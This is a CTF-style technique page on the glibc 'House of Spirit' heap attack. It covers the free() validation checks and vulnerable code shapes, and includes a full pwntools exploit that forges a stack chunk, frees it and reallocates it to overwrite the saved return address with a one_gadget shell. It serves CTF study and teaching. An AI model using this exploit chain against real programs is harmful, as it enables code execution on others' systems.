---
title: "House of Spirit - free() a Fake Chunk and malloc It Back"
category: pwn
subcategory: heap
type: technique
tags: [house-of-spirit, fake-chunk, fastbin, tcache, stack-pivot, arbitrary-allocation, free, invalid-next-size, uaf, ret2win, pwndbg, gef, pwntools, one-gadget, glibc]
difficulty: medium
summary: "Hand free() a pointer you control so a crafted stack or .bss region enters a bin; the next malloc of that size returns it."
when_to_use:
  - "The program frees a pointer that comes from user input or from a struct you fill"
  - "You can write a fake chunk header in front of a stack buffer or a .bss global"
  - "You want an allocation over a saved return address with no heap leak"
  - "An index-based free() has no bounds check, so you can free an arbitrary pointer"
tools: [pwntools, pwndbg, gef, one-gadget]
related: [heap-fake-chunk, house-force, heap-double-free, heap-write-targets, heap-internals-primer]
---

## TL;DR

`free()` does not verify that the pointer it is given ever came from `malloc`. Put a
plausible chunk header in front of a region you control, call `free()` on it, and the
allocator files that region in a bin. The next `malloc()` of the matching size hands it
straight back - typically a stack address, which means writing a ROP chain over the
saved return address without ever leaking the stack.

## Recognise it

- A `free(user_supplied_pointer)` - from a struct field, an index with no bounds check,
  or a "delete by address" menu option.
- `free()` on a *stack* buffer (the decompiler shows `free(&local_var)`).
- An object that stores its own size and data inline and is freed by a helper that
  takes `obj->data`.
- A `realloc(p, 0)` with `p` attacker controlled.

## Vulnerable code shape

```c
struct req {
    size_t  size;          /* attacker controlled */
    char    data[0x30];    /* attacker controlled */
};

void handle(void) {
    struct req r;                  /* on the STACK */
    read(0, &r, sizeof r);
    process(r.data);
    free(r.data);                  /* BUG: frees a stack pointer */
}

/* index flavour */
void do_free(void) {
    long i = read_long();          /* no bounds check */
    free(ptr[i]);                  /* ptr[i] can be read out of range -> any pointer */
}
```

## Theory

Targets: glibc 2.23 - 2.39. The check set differs between the fastbin and tcache paths.

### Fastbin flavour (all versions)

`_int_free` entry checks, in order:

```c
if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
    || __builtin_expect (misaligned_chunk (p), 0))
  malloc_printerr ("free(): invalid pointer");

if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
  malloc_printerr ("free(): invalid size");

/* fastbin path */
if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size)) <= 2 * SIZE_SZ, 0)
    || __builtin_expect (chunksize (chunk_at_offset (p, size)) >= av->system_mem, 0))
  malloc_printerr ("free(): invalid next size (fast)");
```

So the fake chunk needs:

| field | address | requirement |
|-------|---------|-------------|
| chunk pointer | `user - 0x10` | 16-byte aligned |
| `size` | `user - 0x8` | 16-byte aligned, `0x20 <= size <= global_max_fast (0x80)` |
| next `size` | `user - 0x10 + size + 0x8` | in `(0x10, av->system_mem)`, i.e. 0x20..0x20FF0 |

`PREV_INUSE` in the fake `size` is irrelevant for the fastbin path (fastbin frees never
consolidate), but set it anyway - it keeps the chunk from being merged later.

### tcache flavour (2.26+)

`_int_free` checks the tcache path **first**:

```c
size_t tc_idx = csize2tidx (size);
if (tcache != NULL && tc_idx < mp_.tcache_bins)
  {
    if (__glibc_unlikely (e->key == tcache_key)) { ...double free scan... }
    if (tcache->counts[tc_idx] < mp_.tcache_count)
      { tcache_put (p, tc_idx); return; }
  }
```

but this comes **after** the `invalid pointer` / `invalid size` checks in
`_int_free`... except `free()` itself (`__libc_free` -> `_int_free`) in 2.26-2.33 does
the tcache insert before the next-size check. Practically:

- **tcache house of spirit needs only**: 16-byte aligned chunk pointer, and a `size`
  field whose `csize2tidx` is in range (0x20..0x410, 16-byte aligned).
- **No next-size check at all** on the tcache path. That makes tcache house of spirit
  much easier than the fastbin version.
- From 2.34 the *malloc* side adds `aligned_OK(e)`, already satisfied.

### Where to put the fake chunk

- **Stack**: you need the stack address. A `__libc_environ` read, a leaked saved rbp,
  or simply that the challenge prints a stack pointer. Target
  `saved_rip - 0x18` so a 0x18-byte write covers the return address.
- **.bss**: no leak needed for a non-PIE binary. Put the header in a global you can
  set (a "name" field, a length counter) and allocate over a pointer array.
- **Inside another heap chunk**: creates an overlap, same as a size-corruption attack.

## Attack

Stack flavour on glibc 2.31, tcache path, using a 0x60 fake chunk.

1. Leak the stack: `alloc(0, 0x88)`, tcache-poison to `libc.sym['environ']`,
   `show()` -> a stack address. (Any stack leak will do.)
2. Compute `fake = saved_rip - 0x28` so that `fake + 0x10` (the user pointer) is
   `saved_rip - 0x18`, and `fake` is 16-byte aligned. Adjust to keep alignment.
3. Write the fake header into the stack region you control:
   - `fake + 0x08` = `0x61` (a 0x60 chunk, tcache index 4)
   - `fake + 0x68` = `0x21` (only needed for the fastbin path; harmless otherwise)
4. Get the program to `free(fake + 0x10)`.
   - `free(): invalid pointer` -> the pointer is not 16-byte aligned.
   - nothing printed -> the chunk is in `tcache[4]`.
5. `alloc(1, 0x58)` - returns `fake + 0x10` = `saved_rip - 0x18`.
6. Write `b"A"*0x18 + p64(one_gadget)` (or a ROP chain) so the return address is
   overwritten.
7. Return from the function -> the gadget runs.

## Heap state

```text
the stack, before step 3

  rsp  +0x000 | local buffer                     |
       +0x028 | ...                              |
       +0x078 | saved rbp                        |
       +0x080 | saved rip  -> back into main     |


after step 3 (fake chunk header written)

  fake = saved_rip - 0x28
       +0x000 | prev_size (ignored)              |  <- fake chunk starts here
       +0x008 | size = 0x61                      |  <- csize2tidx(0x60) = 4
       +0x010 | user data <- free() gets THIS    |
       ...
       +0x068 | 0x21   (next chunk's size)       |  <- fastbin path only
       ...
       +0x080 | saved rip                        |  <- inside the fake chunk's body


after step 4 (freed)

  tcache->entries[4] -> fake + 0x10        (a STACK address in a heap bin)
  tcache->counts[4]   = 1


after step 5-6 (malloc returns it, we write)

  malloc(0x58) -> fake + 0x10 = saved_rip - 0x18
  write 0x18 padding + p64(one_gadget)
       +0x080 | saved rip = one_gadget           |

  function returns -> execve("/bin/sh", NULL, NULL)
```

## Exploit

```python
#!/usr/bin/env python3
"""House of Spirit: free a fake stack chunk, malloc it back over the return address.

Target: glibc 2.26 - 2.39 (tcache path). Pass FASTBIN to use the pre-tcache
fastbin path, which additionally needs a valid next-chunk size.

Usage:
    ./exploit.py
    ./exploit.py FASTBIN
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
from pwn import ELF, args, context, log, p64, process, remote, u64

BINARY = args.BIN or "./chal"
LIBC = args.LIBC or "./libc.so.6"

context.binary = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
libc = ELF(LIBC, checksec=False)

FAKE_CHUNK_SIZE = 0x60       # -> tcache index 4, fastbin index 4
REQ = FAKE_CHUNK_SIZE - 0x8  # request that maps to FAKE_CHUNK_SIZE


def fake_header(size: int, next_size: int = 0x21) -> bytes:
    """prev_size + size + ... + next chunk's size, for the fastbin path."""
    assert size % 0x10 == 0 and 0x20 <= size, "illegal fake chunk size"
    body = bytearray(size)
    body[0x00:0x08] = p64(0)                 # prev_size (ignored)
    body[0x08:0x10] = p64(size | 1)          # size with PREV_INUSE
    if size >= 0x18:
        body[size - 0x08:size] = p64(next_size)  # only matters for fastbin
    return bytes(body)


io = (remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
      if args.REMOTE else process([BINARY]))


def menu(c):
    io.sendlineafter(b"> ", str(c).encode())


def alloc(i, n, d=b"A"):
    menu(1)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendlineafter(b"size: ", str(n).encode())
    io.sendafter(b"content: ", d)


def free_ptr(addr):
    """The buggy 'free by address' option."""
    menu(2)
    io.sendlineafter(b"address: ", hex(addr).encode())


def free_idx(i):
    menu(2)
    io.sendlineafter(b"index: ", str(i).encode())


def show(i):
    menu(3)
    io.sendlineafter(b"index: ", str(i).encode())
    io.recvuntil(b"content: ")
    return u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00")[:8])


def edit(i, d):
    menu(4)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendafter(b"content: ", d)


def stack_write(offset, data):
    """Write into the stack frame the challenge exposes (the fake chunk home)."""
    menu(5)
    io.sendlineafter(b"offset: ", str(offset).encode())
    io.sendafter(b"data: ", data)


# ------------------------------------------------------------ 1. libc leak
alloc(0, 0x418, b"leaker")
alloc(1, 0x18, b"guard")
free_idx(0)
libc.address = show(0) - 0x60 - libc.sym["main_arena"]
log.success("libc base = %#x", libc.address)

# ------------------------------------------------------------ 2. stack leak
alloc(2, 0x88, b"A" * 8)
alloc(3, 0x88, b"B" * 8)
free_idx(2)
free_idx(3)
edit(3, p64(libc.sym["environ"]))       # tcache poison (raw fd: glibc <= 2.31)
alloc(4, 0x88, b"pad")
alloc(5, 0x88, b"X" * 8)
stack_leak = show(5)
log.success("environ (stack) = %#x", stack_leak)

# The distance from environ to the frame you control is constant per binary.
# Find it once: `pwndbg> p $rsp` inside the vulnerable function, then subtract.
SAVED_RIP_OFF = 0x140                    # <- measure this in gdb
saved_rip = stack_leak - SAVED_RIP_OFF
log.info("saved rip @ %#x", saved_rip)

# ------------------------------------------------ 3. plant the fake chunk
fake_chunk = saved_rip - 0x28
assert fake_chunk % 0x10 == 0, "shift SAVED_RIP_OFF by 8 to fix alignment"
fake_user = fake_chunk + 0x10
log.info("fake chunk @ %#x, user @ %#x", fake_chunk, fake_user)

hdr = fake_header(FAKE_CHUNK_SIZE, 0x21 if args.FASTBIN else 0)
stack_write(0, hdr)                      # writes the header into the frame

# --------------------------------------------------- 4. free the fake chunk
if args.FASTBIN:
    for i in range(7):                   # saturate tcache so free() uses fastbin
        alloc(10 + i, REQ, b"filler")
    for i in range(7):
        free_idx(10 + i)
free_ptr(fake_user)
log.success("fake stack chunk is now in a bin")

# -------------------------------- 5. malloc it back and overwrite saved rip
one_gadget = libc.address + int(args.ONEGADGET or "0x50a37", 0)
alloc(6, REQ, b"A" * 0x18 + p64(one_gadget))
log.success("saved rip = %#x", one_gadget)

menu(6)                                  # return from the vulnerable function
io.interactive()
```

## Variants & pitfalls

- **`free(): invalid pointer`** = the pointer is not 16-byte aligned, or
  `p > (uintptr_t)-size`. Shift your fake chunk by 8.
- **`free(): invalid size`** = your `size` field is below 0x20 or not 16-byte aligned.
- **`free(): invalid next size (fast)`** = fastbin path only; write a plausible size at
  `fake + size`. 0x21 always works.
- **tcache makes it trivial.** On 2.26+ prefer the tcache path: no next-size check,
  and 7 free slots per bin.
- **The fake chunk must survive.** If the stack frame you used is reused before your
  `malloc`, the header is gone. Free and allocate back-to-back.
- **`tcache_put` writes `key` into `fake+0x18`.** That clobbers 8 bytes of your stack
  frame. Make sure nothing important lives there.
- **A stack leak is usually the hard part.** `libc.sym['environ']` holds a pointer into
  the environment block near the top of the stack; the offset to your frame is fixed
  per binary but must be measured in gdb.
- **Same technique on .bss** needs no leak for a non-PIE binary, and the "next size"
  can be a global you set through the menu.

## Debugging

```text
pwndbg> tcache                      # the stack address should appear in entries[]
pwndbg> bins
pwndbg> try_free <fake_chunk>       # dry run; prints which check would fail
pwndbg> x/4gx <fake_chunk>
pwndbg> p &environ
pwndbg> p $rsp
pwndbg> telescope $rsp 30           # locate the saved rip offset
pwndbg> vmmap
gef>  heap bins tcache
```

```bash
# Measure the environ -> frame distance once.
# gdb: break at the vulnerable function, then
#   p (long)*(void**)&environ - (long)$rsp
gdb -q ./chal -ex 'b handle' -ex run
```

## Tools

- `pwndbg try_free` - tells you the exact failing check before you waste a run.
- `one_gadget` for the return-address payload.
- `how2heap house_of_spirit.c` / `tcache_house_of_spirit.c`.

## References

- shellphish `how2heap`: `house_of_spirit.c`, `tcache_house_of_spirit.c`.
- glibc `malloc/malloc.c`: `_int_free` validation, `tcache_put`.
- CTF Wiki, "House of Spirit".
